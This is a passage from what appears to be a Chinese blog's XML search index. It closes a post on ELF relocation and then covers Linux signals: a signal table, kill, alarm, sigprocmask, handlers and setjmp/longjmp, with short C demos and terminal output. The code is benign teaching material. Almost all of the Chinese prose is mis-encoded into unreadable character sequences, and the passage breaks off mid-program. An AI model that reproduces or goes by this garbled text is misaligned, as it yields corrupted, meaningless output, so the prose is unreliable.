00 00 00          call   80480cd &lt;swap&gt;;å¯¹swapå¼•ç”¨</span><br></pre></td></tr></table></figure><p>6c 91 04 08 å³0x804916c sharedçš„åœ°å€</p><p>10 00 00 00 å³0x00000010 0x80480b8+0x5+0x10&#x3D;0x80480CD</p><blockquote><p>ç›¸å¯¹å¯»å€ä¸ºä»€ä¹ˆåŸæ¥é‡Œé¢åç§»è¦å¡«-4å‘¢ï¼Œå³fffffffc(-4)ï¼Ÿ</p><p>ä¿®æ­£çš„æ—¶å€™æ˜¯æŒ‰ç…§é‡å®šä½è¡¨é‡Œçš„å½“å‰è¦ä¿®æ­£ä½ç½®</p><p>ç¨‹åºæ‰§è¡Œæ˜¯ç›¸å¯¹å¯»å€æ˜¯ç›¸å¯¹äºeipçš„ï¼Œç›¸å¯¹äºçš„æ˜¯å½“å‰æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤</p><p>ä¿®æ­£æ—¶S+A-Pç›¸å½“äºs-(p+4)ï¼Œp+4å³ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œå°±ç»Ÿä¸€èµ·æ¥</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ELF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux ä¿¡å·(Signal)</title>
      <link href="/2023/04/24/linux-signal/"/>
      <url>/2023/04/24/linux-signal/</url>
      
        <content type="html"><![CDATA[<h2 id="Linuxå¯¹å¼‚å¸¸çš„å¤„ç†"><a href="#Linuxå¯¹å¼‚å¸¸çš„å¤„ç†" class="headerlink" title="Linuxå¯¹å¼‚å¸¸çš„å¤„ç†"></a>Linuxå¯¹å¼‚å¸¸çš„å¤„ç†</h2><p>é™·å…¥å†…æ ¸è°ƒç”¨å¼‚å¸¸å¤„ç†ç¨‹åºï¼Œå¯¹äºæ•…éšœ(Fault)</p><ul><li><p>å¦‚æœå¤„ç†ç¨‹åºå¯ä»¥ä¿®å¤çš„æ•…éšœï¼Œæ¯”å¦‚æ­£å¸¸çš„ç¼ºé¡µï¼Œä¿®å¤åå›åˆ°æ–­ç‚¹å¤„ç»§ç»­æ‰§è¡Œ</p></li><li><p>å¦‚æœä¸èƒ½ä¿®å¤çš„ï¼Œæ¯”å¦‚è¶Šçº§ï¼Œè¶Šæƒï¼Œè¶Šç•Œï¼Œé™¤0ç­‰ï¼Œlinuxåªä¼šç»™è¿›ç¨‹å‘é€ä¸€ä¸ªä¿¡å·ï¼Œå›åˆ°ç”¨æˆ·æ€ï¼Œè¿›ç¨‹å»è°ƒåº¦ç›¸åº”çš„ä¿¡å·å¤„ç†ç¨‹åºï¼Œè¿™æ ·åšæ˜¯å¿«é€Ÿåœ¨å†…æ ¸æ€å®Œæˆå¼‚å¸¸å¤„ç†ï¼Œå‡å°åµŒå¥—æ‰§è¡Œå¼‚å¸¸çš„å¯èƒ½æ€§</p></li></ul><p>linuxé‡Œå¯ä»¥ç”¨kill -læŸ¥çœ‹ä¿¡å·åˆ—è¡¨ï¼Œç¼–å·ä¸º1 ~ 31çš„ä¿¡å·ä¸ºä¼ ç»ŸUNIXæ”¯æŒçš„ä¿¡å·ï¼Œæ˜¯ä¸å¯é ä¿¡å·(éå®æ—¶çš„)ï¼Œç¼–å·ä¸º32 ~ 63çš„ä¿¡å·æ˜¯åæ¥æ‰©å……çš„ï¼Œç§°åšå¯é ä¿¡å·(å®æ—¶ä¿¡å·)ã€‚ä¸å¯é ä¿¡å·å’Œå¯é ä¿¡å·çš„åŒºåˆ«åœ¨äºå‰è€…ä¸æ”¯æŒæ’é˜Ÿï¼Œå¯èƒ½ä¼šé€ æˆä¿¡å·ä¸¢å¤±ï¼Œè€Œåè€…ä¸ä¼šã€‚</p><table><thead><tr><th>ä¿¡å·å€¼</th><th>ä¿¡å·åç§°</th><th>è¯´æ˜</th><th>é»˜è®¤è¡Œä¸º</th></tr></thead><tbody><tr><td>1</td><td><code>SIGHUP</code></td><td>ç»ˆç«¯æ–­å¼€è¿æ¥</td><td>ç»ˆæ­¢è¿›ç¨‹</td></tr><tr><td>2</td><td><code>SIGINT</code></td><td>ç»ˆç«¯ä¸­æ–­ç¬¦ï¼ˆCtrl+Cï¼‰</td><td>ç»ˆæ­¢è¿›ç¨‹</td></tr><tr><td>3</td><td><code>SIGQUIT</code></td><td>ç»ˆç«¯é€€å‡ºç¬¦ï¼ˆCtrl+\ï¼‰</td><td>ç”Ÿæˆcoreæ–‡ä»¶å¹¶ç»ˆæ­¢è¿›ç¨‹</td></tr><tr><td>4</td><td><code>SIGILL</code></td><td>éæ³•æŒ‡ä»¤</td><td>ç”Ÿæˆcoreæ–‡ä»¶å¹¶ç»ˆæ­¢è¿›ç¨‹</td></tr><tr><td>5</td><td><code>SIGTRAP</code></td><td>è·Ÿè¸ªæ–­ç‚¹</td><td>ç”Ÿæˆcoreæ–‡ä»¶å¹¶ç»ˆæ­¢è¿›ç¨‹</td></tr><tr><td>6</td><td><code>SIGABRT</code></td><td>å¼‚å¸¸ç»ˆæ­¢</td><td>ç”Ÿæˆcoreæ–‡ä»¶å¹¶ç»ˆæ­¢è¿›ç¨‹</td></tr><tr><td>7</td><td><code>SIGBUS</code></td><td>æ€»çº¿é”™è¯¯</td><td>ç”Ÿæˆcoreæ–‡ä»¶å¹¶ç»ˆæ­¢è¿›ç¨‹</td></tr><tr><td>8</td><td><code>SIGFPE</code></td><td>æµ®ç‚¹å¼‚å¸¸</td><td>ç”Ÿæˆcoreæ–‡ä»¶å¹¶ç»ˆæ­¢è¿›ç¨‹</td></tr><tr><td>9</td><td><code>SIGKILL</code></td><td>æ— æ¡ä»¶ç»ˆæ­¢</td><td>ç»ˆæ­¢è¿›ç¨‹</td></tr><tr><td>10</td><td><code>SIGUSR1</code></td><td>ç”¨æˆ·å®šä¹‰ä¿¡å·1</td><td>ç»ˆæ­¢è¿›ç¨‹</td></tr><tr><td>11</td><td><code>SIGSEGV</code></td><td>æ®µé”™è¯¯</td><td>ç”Ÿæˆcoreæ–‡ä»¶å¹¶ç»ˆæ­¢è¿›ç¨‹</td></tr><tr><td>12</td><td><code>SIGUSR2</code></td><td>ç”¨æˆ·å®šä¹‰ä¿¡å·2</td><td>ç»ˆæ­¢è¿›ç¨‹</td></tr><tr><td>13</td><td><code>SIGPIPE</code></td><td>å†™å…¥ç®¡é“æˆ–å¥—æ¥å­—æ—¶ï¼Œè¯»å–ç«¯å·²å…³é—­</td><td>ç»ˆæ­¢è¿›ç¨‹</td></tr><tr><td>14</td><td><code>SIGALRM</code></td><td>å®šæ—¶å™¨ä¿¡å·</td><td>ç»ˆæ­¢è¿›ç¨‹</td></tr><tr><td>15</td><td><code>SIGTERM</code></td><td>ç»ˆæ­¢è¯·æ±‚</td><td>ç»ˆæ­¢è¿›ç¨‹</td></tr><tr><td>16</td><td><code>SIGSTKFLT</code></td><td>åå¤„ç†å™¨å †æ ˆé”™è¯¯</td><td>ç”Ÿæˆcoreæ–‡ä»¶å¹¶ç»ˆæ­¢è¿›ç¨‹</td></tr><tr><td>17</td><td><code>SIGCHLD</code></td><td>å­è¿›ç¨‹çŠ¶æ€å˜åŒ–</td><td>å¿½ç•¥ä¿¡å·</td></tr><tr><td>18</td><td><code>SIGCONT</code></td><td>ç»§ç»­æ‰§è¡Œåœæ­¢çš„è¿›ç¨‹</td><td>å¿½ç•¥ä¿¡å·</td></tr><tr><td>19</td><td><code>SIGSTOP</code></td><td>åœæ­¢è¿›ç¨‹ï¼Œä¸èƒ½è¢«æ•æ‰æˆ–å¿½ç•¥</td><td>åœæ­¢è¿›ç¨‹</td></tr><tr><td>20</td><td><code>SIGTSTP</code></td><td>ç»ˆç«¯åœæ­¢ç¬¦ï¼ˆCtrl+Zï¼‰</td><td>åœæ­¢è¿›ç¨‹</td></tr><tr><td>21</td><td><code>SIGTTIN</code></td><td>åå°è¿›ç¨‹è¯•å›¾ä»ç»ˆç«¯è¯»å–</td><td>åœæ­¢è¿›ç¨‹</td></tr><tr><td>22</td><td><code>SIGTTOU</code></td><td>åå°è¿›ç¨‹è¯•å›¾å‘ç»ˆç«¯å†™å…¥</td><td>åœæ­¢è¿›ç¨‹</td></tr><tr><td>23</td><td><code>SIGURG</code></td><td>å¥—æ¥å­—ä¸Šæ¥æ”¶åˆ°ç´§æ€¥æ•°æ®</td><td>å¿½ç•¥ä¿¡å·</td></tr><tr><td>24</td><td><code>SIGXCPU</code></td><td>CPUæ—¶é—´é™åˆ¶è¶…æ—¶</td><td>ç”Ÿæˆcoreæ–‡ä»¶å¹¶ç»ˆæ­¢è¿›ç¨‹</td></tr><tr><td>25</td><td><code>SIGXFSZ</code></td><td>æ–‡ä»¶å¤§å°é™åˆ¶è¶…æ—¶</td><td>ç”Ÿæˆcoreæ–‡ä»¶å¹¶ç»ˆæ­¢è¿›ç¨‹</td></tr><tr><td>26</td><td><code>SIGVTALRM</code></td><td>è™šæ‹Ÿå®šæ—¶å™¨ä¿¡å·</td><td>ç»ˆæ­¢è¿›ç¨‹</td></tr><tr><td>27</td><td><code>SIGPROF</code></td><td>åˆ†æ—¶å®šæ—¶å™¨ä¿¡å·</td><td>ç»ˆæ­¢è¿›ç¨‹</td></tr><tr><td>28</td><td><code>SIGWINCH</code></td><td>çª—å£å¤§å°å˜åŒ–</td><td>å¿½ç•¥ä¿¡å·</td></tr><tr><td>29</td><td><code>SIGIO</code></td><td>å¼‚æ­¥I&#x2F;Oäº‹ä»¶</td><td>å¿½ç•¥ä¿¡å·</td></tr><tr><td>30</td><td>SIGPWR</td><td>ç”µæºæ•…éšœ</td><td>ç»ˆæ­¢</td></tr><tr><td>31</td><td>SIGSYS</td><td>éæ³•ç³»ç»Ÿè°ƒç”¨</td><td>ç»ˆæ­¢</td></tr></tbody></table><p>è¿™ç§ä¿¡å·æœºåˆ¶ï¼Œç»™äº†ç”¨æˆ·ä¸€ç§è¿›ç¨‹é—´é€šä¿¡æœºåˆ¶ï¼Œè‡ªå®šä¹‰ä¿¡å·å¤„ç†ç¨‹åºçš„æƒåŠ›</p><p>linux 1 ~ 31é‡Œä¸€ç§ç±»å‹çš„ä¿¡å·æœ€å¤šåªæœ‰ä¸€ä¸ªå¾…å¤„ç†ä¿¡å·(ä¸€ä¸ªå‘å‡ºè€Œæ²¡æœ‰è¢«æ¥æ”¶å¤„ç†çš„ä¿¡å·å«åšå¾…å¤„ç†ä¿¡å·)ï¼Œå› ä¸ºä¼ ç»ŸUNIXæ”¯æŒçš„ä¿¡å·æ˜¯ç”¨bitflagå®ç°çš„ï¼Œå·²ç»ç½®1å†ç½®1ä¹Ÿæ²¡æ„æ€ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå«ä¸å¯é ä¿¡å·çš„åŸå› ï¼Œåé¢åºå·çš„å¯é ä¿¡å·éƒ½æ˜¯é€šè¿‡é˜Ÿåˆ—æ¥å®ç°</p><h2 id="å‘é€ä¿¡å·"><a href="#å‘é€ä¿¡å·" class="headerlink" title="å‘é€ä¿¡å·"></a>å‘é€ä¿¡å·</h2><ol><li><p>å†…æ ¸çš„å¼‚å¸¸å¤„ç†ç¨‹åº</p></li><li><p>&#x2F;bin&#x2F;killå‘é€</p></li></ol><blockquote><p>&#x2F;bin&#x2F;kill -signalid pid</p><p>pidä¸ºæ­£æ•°ç»™pidè¿›ç¨‹ å‘é€signalidä¿¡å·</p><p>pidä¸ºè´Ÿæ•°ç»™pid<strong>è¿›ç¨‹ç»„</strong>æ‰€æœ‰è¿›ç¨‹å‘é€signalidä¿¡å·</p></blockquote><ol start="3"><li>é”®ç›˜å‘é€ä¿¡å· ctrl c ctrl zç­‰</li><li>killå‡½æ•°æ˜¾å¼åœ°è¦æ±‚å†…æ ¸å‘é€ä¸€ä¸ªä¿¡å·ç»™ç›®çš„è¿›ç¨‹ã€‚</li></ol><blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">kill</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">int</span> sig)</span>;</span><br><span class="line">æˆåŠŸè¿”å›<span class="number">0</span> å¦åˆ™è¿”å›<span class="number">-1</span>;</span><br><span class="line">pid &gt;<span class="number">0</span> å‘é€sigç»™è¿›ç¨‹pid;</span><br><span class="line">pid =<span class="number">0</span> å‘é€sigç»™è°ƒç”¨è¿›ç¨‹æ‰€åœ¨è¿›ç¨‹ç»„çš„æ¯ä¸€ä¸ªè¿›ç¨‹(åŒ…æ‹¬è‡ªå·±);</span><br><span class="line">pid &lt;<span class="number">0</span> å‘é€sigç»™|pid|è¿›ç¨‹ç»„çš„æ¯ä¸€ä¸ªè¿›ç¨‹</span><br></pre></td></tr></table></figure></blockquote><ol start="5"><li>alarmå‡½æ•°</li></ol><blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">alarm</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> secs)</span>;</span><br><span class="line">åœ¨secsç§’å    å‘é€ä¸€ä¸ªSIGALRMä¿¡å·ç»™è°ƒç”¨è¿›ç¨‹ secsä¸º<span class="number">0</span>ä¸ä¼šè°ƒåº¦å®‰æ’æ–°é—¹é’Ÿï¼Œä»»ä½•æƒ…å†µä¸‹éƒ½ä¼šå–æ¶ˆå¾…å¤„ç†(pending)çš„é—¹é’Ÿï¼Œè¿”å›å‰©ä½™ç§’æ•°ï¼Œæ²¡æœ‰å¾…å¤„ç†çš„é—¹é’Ÿè¿”å›<span class="number">0</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="æ¥å—ä¿¡å·"><a href="#æ¥å—ä¿¡å·" class="headerlink" title="æ¥å—ä¿¡å·"></a>æ¥å—ä¿¡å·</h2><p>éšå¼é˜»å¡æœºåˆ¶</p><blockquote><p>å†…æ ¸é»˜è®¤é˜»å¡ä»»ä½•å½“å‰å¤„ç†ç¨‹åºæ­£åœ¨å¤„ç†ä¿¡å·ç±»å‹çš„å¾…å¤„ç†çš„ä¿¡å·ã€‚ä¹Ÿå°±æ˜¯ä¿¡å·å¤„ç†ç¨‹åºæ‰§è¡Œæ—¶ä¸æ¥å—æ­£åœ¨å¤„ç†ç±»å‹çš„ä¿¡å·</p></blockquote><p>æ˜¾ç¤ºé˜»å¡æœºåˆ¶</p><blockquote><p>åº”ç”¨ç¨‹åºå¯ä»¥ä½¿ç”¨ sigprocmask å‡½æ•°å’Œå®ƒçš„è¾…åŠ©å‡½æ•°ï¼Œæ¥è®¾ç½®ä¿¡å·å±è”½å­—ï¼Œæ˜ç¡®åœ°é˜»å¡å’Œè§£é™¤é˜»å¡é€‰å®šçš„ä¿¡å·ã€‚<strong>SIGKILL å’Œ SIGSTOP ä¸èƒ½è¢«é˜»å¡</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sigprocmask</span><span class="params">(<span class="type">int</span> how, <span class="type">const</span> <span class="type">sigset_t</span> *<span class="built_in">set</span>, <span class="type">sigset_t</span> *oldset)</span>;</span><br><span class="line">how å€¼ï¼š</span><br><span class="line">SIG_BLOCK:æŠŠ<span class="built_in">set</span>é‡Œä¿¡å·æ·»åŠ åˆ°blockedåˆ—è¡¨</span><br><span class="line">SIG_UNBLOCK:ä»blockedé‡Œåˆ é™¤<span class="built_in">set</span>é‡Œçš„ä¿¡å·</span><br><span class="line">SIG_SETMASK:block=<span class="built_in">set</span></span><br><span class="line">æŠŠæ—§çš„blockedä¿å­˜åˆ°oldset</span><br><span class="line"><span class="built_in">set</span> ä¸º<span class="literal">NULL</span>ï¼Œè¯»å–ç°åœ¨çš„å±è”½å€¼</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> sigemptyset(<span class="type">sigset_t</span> *<span class="built_in">set</span>);</span><br><span class="line">åˆå§‹åŒ–<span class="built_in">set</span>ä¸º<span class="number">0</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sigfillset</span><span class="params">(<span class="type">sigset_t</span> *<span class="built_in">set</span>)</span>;</span><br><span class="line">æ‰€æœ‰ä¿¡å·å¡«å…¥<span class="built_in">set</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sigaddset</span><span class="params">(<span class="type">sigset_t</span> *<span class="built_in">set</span>, <span class="type">int</span> signum)</span>;</span><br><span class="line">å¡«å…¥signum</span><br><span class="line"><span class="type">int</span> <span class="title function_">sigdelset</span><span class="params">(<span class="type">sigset_t</span> *<span class="built_in">set</span>, <span class="type">int</span> signum)</span>;</span><br><span class="line">åˆ é™¤signum</span><br><span class="line">è¿”å›ï¼šå¦‚æœæˆåŠŸåˆ™ä¸º o, è‹¥å‡ºé”™åˆ™ä¸º<span class="number">-1</span> ã€‚</span><br><span class="line"><span class="type">int</span> <span class="title function_">sigismember</span><span class="params">(<span class="type">const</span> <span class="type">sigset_t</span> *<span class="built_in">set</span>, <span class="type">int</span> signum)</span>;</span><br><span class="line">è¿”å›ï¼šè‹¥ signum æ˜¯ <span class="built_in">set</span> çš„æˆå‘˜åˆ™ä¸º <span class="number">1</span>, å¦‚æœä¸æ˜¯åˆ™ä¸º <span class="number">0</span> è‹¥å‡ºé”™åˆ™ä¸º<span class="number">-1</span></span><br></pre></td></tr></table></figure></blockquote><p>æ˜¾ç¤ºé˜»å¡å¹¶ä¸æ˜¯è¢«ç›´æ¥ä¸¢å¼ƒäº†ï¼Œåœ¨æ¢å¤é˜»å¡åï¼Œè¿˜å¯ä»¥æ¥æ”¶åˆ°</p><h2 id="ä¿®æ”¹å’Œä¿¡å·ç›¸å…³è”çš„é»˜è®¤è¡Œä¸º"><a href="#ä¿®æ”¹å’Œä¿¡å·ç›¸å…³è”çš„é»˜è®¤è¡Œä¸º" class="headerlink" title="ä¿®æ”¹å’Œä¿¡å·ç›¸å…³è”çš„é»˜è®¤è¡Œä¸º"></a>ä¿®æ”¹å’Œä¿¡å·ç›¸å…³è”çš„é»˜è®¤è¡Œä¸º</h2><p>IGSTOPå’ŒSIGKILLä¸èƒ½ä¿®æ”¹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*<span class="type">sighandler_t</span>)</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">sighandler_t</span> <span class="title function_">signal</span><span class="params">(<span class="type">int</span> signum, <span class="type">sighandler_t</span> handler)</span>;</span><br><span class="line">è¿”å›ï¼šè‹¥æˆåŠŸåˆ™ä¸ºæŒ‡å‘å‰æ¬¡å¤„ç†ç¨‹åºçš„æŒ‡é’ˆï¼Œè‹¥å‡ºé”™åˆ™ä¸ºSIG_ERRCä¸è®¾ç½®errno);</span><br><span class="line">handler æ˜¯SIG_IGN å¿½ç•¥signumè¯¥ç±»å‹ä¿¡å·;</span><br><span class="line">handler æ˜¯SIG_DFL signumæ¢å¤é»˜è®¤è¡Œä¸º;</span><br><span class="line">handler æ˜¯ä¸ªå‡½æ•°åœ°å€ è®¾ç½®è¯¥å‡½æ•°ä¸ºå¼‚å¸¸å¤„ç†å‡½æ•°</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">signal_handler</span><span class="params">(<span class="type">int</span> sig)</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ctrl c&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">__sighandler_t</span> rs = signal(SIGINT, signal_handler);</span><br><span class="line">    assert(rs != SIG_ERR);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; gcc -g -O2 -o test test.c</span><br><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">^Cctrl c</span><br><span class="line">^Cctrl c</span><br><span class="line">^Cctrl c</span><br><span class="line">^Cctrl c</span><br><span class="line">^Cctrl c</span><br></pre></td></tr></table></figure><p>å¤„ç†ç¨‹åºç»“æŸåä¼šè¿”å›åˆ°æ–­ç‚¹å¤„ç»§ç»­</p><p>é˜»å¡æ‰SIGINTä¿¡å·</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">signal_handler</span><span class="params">(<span class="type">int</span> sig)</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ctrl c&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">sigset_t</span> mask;</span><br><span class="line">    sigemptyset(&amp;mask);</span><br><span class="line">    sigaddset(&amp;mask, SIGINT);</span><br><span class="line">    sigprocmask(SIG_BLOCK,&amp;mask,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">__sighandler_t</span> rs = signal(SIGINT, signal_handler);</span><br><span class="line">    assert(rs != SIG_ERR);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; gcc -g -O2 -o test test.c</span><br><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^Z</span><br><span class="line">fish: Job 6, &#x27;./test&#x27; has stopped</span><br></pre></td></tr></table></figure><h3 id="éæœ¬åœ°è·³è½¬"><a href="#éæœ¬åœ°è·³è½¬" class="headerlink" title="éæœ¬åœ°è·³è½¬"></a>éæœ¬åœ°è·³è½¬</h3><p>æ•´æ•°é™¤0ä¼šSIGFPE</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">fish: Job 1, &#x27;./test&#x27; terminated by signal SIGFPE (Floating point exception)</span><br></pre></td></tr></table></figure><p>æœ¬æ¥æƒ³ç€æ”¹æ‰SIGFPEçš„é»˜è®¤å¤„ç†ï¼Œçœ‹çœ‹æ•´æ•°é™¤0åç»“æœæ˜¯ä»€ä¹ˆæ ·</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">signal_handler</span><span class="params">(<span class="type">int</span> sig)</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">__sighandler_t</span> rs = signal(SIGFPE, signal_handler);</span><br><span class="line">    assert(rs != SIG_ERR);</span><br><span class="line">    <span class="type">int</span> z = <span class="number">12</span>;</span><br><span class="line">    <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">    z = z / t;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»“æœå¿˜äº†ä¿¡å·å¤„ç†å‡½æ•°è¿‡åä¼šè¿”å›åˆ°æ–­ç‚¹å¤„ï¼Œä¹Ÿå°±æ˜¯å¯¼è‡´è¿™ä¸ªå¼‚å¸¸çš„è¯­å¥å¤„z &#x3D; z &#x2F; t;ç„¶åå°±ä¼šä¸€ç›´å¯¼è‡´SIGFPEï¼Œgotoåªèƒ½å®ç°å‡½æ•°å†…çš„è·³è½¬ï¼Œå…¶å®gotoåœ¨æ±‡ç¼–å±‚å°±æ˜¯ä¸€ä¸ªæ— æ¡ä»¶çš„è·³è½¬jmpï¼Œä»–ä¹Ÿæ²¡èƒ½åŠ›å®ç°å‡½æ•°é—´çš„è·³è½¬ï¼Œé™¤éä»–èƒ½æŠŠæ ˆç»™å¹³äº†ï¼Œå¯„å­˜å™¨ä¿®æ­£äº†</p><p>ä½¿ç”¨setjmpå°±å¯ä»¥åšåˆ°</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">setjmp</span><span class="params">(jmp_buf env)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sigsetjmp</span><span class="params">(sigjmp_buf env, <span class="type">int</span> savesigs)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">longjmp</span><span class="params">(jmp_buf env, <span class="type">int</span> val)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">siglongjmp</span><span class="params">(sigjmp_buf env, <span class="type">int</span> val)</span>;</span><br></pre></td></tr></table></figure><p>setjmpæŠŠå½“å‰ç¨‹åºå„ç§ä¿¡æ¯ä¿å­˜åˆ°envé‡Œ(typically, the stack pointer, the instruction pointer,  possibly  the  values  of other registers and the signal mask),ç›´æ¥è°ƒç”¨è¿”å›0ï¼Œ</p><p>longjmpåˆ©ç”¨æœ€è¿‘ä¸€æ¬¡ä¿å­˜çš„envæ¥æ¢å¤ä¹‹å‰çš„ç¯å¢ƒï¼ŒæˆåŠŸè°ƒç”¨åä¸è¿”å›ï¼ŒåŸæ¥çš„setjmpä¼šå†æ¬¡è¿”å›ç¬¬äºŒä¸ªå‚æ•°valçš„å€¼</p><p>sigsetjmpå’Œsetjmpå·®ä¸å¤šåªæ˜¯ï¼Œsigsetjmpåªè¦ç¬¬äºŒä¸ªå‚æ•°ä¸ä¸º0å°±ä¼šä¿å­˜ä¿¡å·å±è”½å­—ï¼Œjmpè¿‡æ¥æ—¶æ¢å¤ï¼Œsigsetä¸ä¼š</p><p>æ‰‹å†ŒåŸè¯</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sigsetjmp() and <span class="title function_">siglongjmp</span><span class="params">()</span></span><br><span class="line">       <span class="title function_">sigsetjmp</span><span class="params">()</span>  and  <span class="title function_">siglongjmp</span><span class="params">()</span> also perform nonlocal gotos, but provide</span><br><span class="line">       predictable handling of the process signal mask.</span><br><span class="line"></span><br><span class="line">       If, and only <span class="keyword">if</span>, the savesigs argument provided to <span class="title function_">sigsetjmp</span><span class="params">()</span> is  nonâ€</span><br><span class="line">       zero, the process&#x27;s current signal mask is saved in env and will be reâ€</span><br><span class="line">       stored <span class="keyword">if</span> a <span class="title function_">siglongjmp</span><span class="params">()</span> is later performed with this env.</span><br></pre></td></tr></table></figure><p>sigpending()ç”¨äºè·å–å½“å‰è¿›ç¨‹å·²ç»è¢«é˜»å¡ä½†å°šæœªå¤„ç†çš„ä¿¡å·é›†åˆ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">jmp_buf env;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">sigset_t</span> mask, pendmask, blockmask;</span><br><span class="line">    sigemptyset(&amp;mask);</span><br><span class="line">    sigemptyset(&amp;pendmask);</span><br><span class="line">    sigemptyset(&amp;blockmask);</span><br><span class="line">    sigaddset(&amp;mask, SIGINT);</span><br><span class="line">    sigprocmask(SIG_BLOCK, &amp;mask, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// if (sigsetjmp(env, 666) != 0) &#123;</span></span><br><span class="line">        <span class="keyword">if</span> (setjmp(env) != <span class="number">0</span>) &#123;</span><br><span class="line">        sigpending(&amp;pendmask);</span><br><span class="line">        